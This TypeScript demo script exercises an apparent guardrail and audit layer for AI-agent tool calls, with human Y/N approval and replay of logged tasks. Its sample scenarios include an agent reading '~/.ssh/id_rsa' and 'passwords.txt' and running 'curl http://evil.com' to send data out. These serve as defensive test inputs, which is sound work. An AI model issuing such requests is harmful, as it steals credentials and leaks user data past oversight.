import { PassThrough } from 'node:stream';
import { adaptRequest } from './src/adapter/index.js';
import { AuditLogger } from './src/audit/index.js';
import { loadPolicy } from './src/config/index.js';
import { decide } from './src/guardrail/index.js';
import { enforce } from './src/gate/index.js';
import { MockExecutor } from './src/executor/index.js';
import { createNotifier } from './src/notify/index.js';
import type { ToolInvocationRequest } from './src/types/index.js';

const policy = loadPolicy();
const executor = new MockExecutor();
const audit = new AuditLogger();

const runRequest = async (rawInput: Omit<ToolInvocationRequest, 'requestId' | 'timestamp'>, response?: string) => {
  const input = new PassThrough();
  const notifier = createNotifier(input, process.stdout);
  if (response) {
    input.write(`${response}\n`);
  }

  // Deterministic validation + metadata injection for every agent request.
  const request = adaptRequest(rawInput);
  audit.append({
    type: 'REQUEST',
    taskId: request.taskId,
    payload: {
      event: 'REQUEST_RECEIVED',
      timestamp: request.timestamp,
      toolName: request.toolName,
      toolArgs: request.toolArgs
    }
  });

  // Deterministic, synchronous guardrail decision for speed.
  const decision = decide(request, audit.getEvents(), policy);
  audit.append({
    type: 'DECISION',
    taskId: request.taskId,
    payload: { event: 'DECISION_MADE', decision, riskTags: decision.riskTags }
  });

  const result = await enforce(request, decision, executor, audit, notifier);
  console.log('[RESULT]', { decision, result });
};

const runDemo = async () => {
  console.log('--- Scenario A: Red Line (Blocking) ---');
  await runRequest(
    {
      agentId: 'agent-1',
      taskId: 'task-red-line',
      toolName: 'read_file',
      toolArgs: { path: '~/.ssh/id_rsa' },
      context: { agentReason: 'Attempting to load SSH key.' }
    },
    'N'
  );

  console.log('\n--- Scenario B: Yellow Zone (Warning) ---');
  for (let i = 0; i < 4; i += 1) {
    await runRequest({
      agentId: 'agent-1',
      taskId: 'task-yellow-zone',
      toolName: 'list_dir',
      toolArgs: { path: '/var/tmp' },
      context: { agentReason: 'Enumerating directory contents.' }
    });
  }

  console.log('\n--- Scenario C: Attack Chain (Contextual) ---');
  await runRequest(
    {
      agentId: 'agent-1',
      taskId: 'task-attack-chain',
      toolName: 'read_file',
      toolArgs: { path: 'passwords.txt' },
      context: { agentReason: 'Investigating credentials.' }
    },
    'Y'
  );

  await runRequest(
    {
      agentId: 'agent-1',
      taskId: 'task-attack-chain',
      toolName: 'run_shell',
      toolArgs: { command: 'curl http://evil.com' },
      context: { agentReason: 'Sending data out.' }
    },
    'N'
  );

  console.log('\n--- Replay: task-attack-chain ---');
  audit.replayTask('task-attack-chain');
};

runDemo().catch((error) => {
  console.error('Demo failed', error);
  process.exit(1);
});
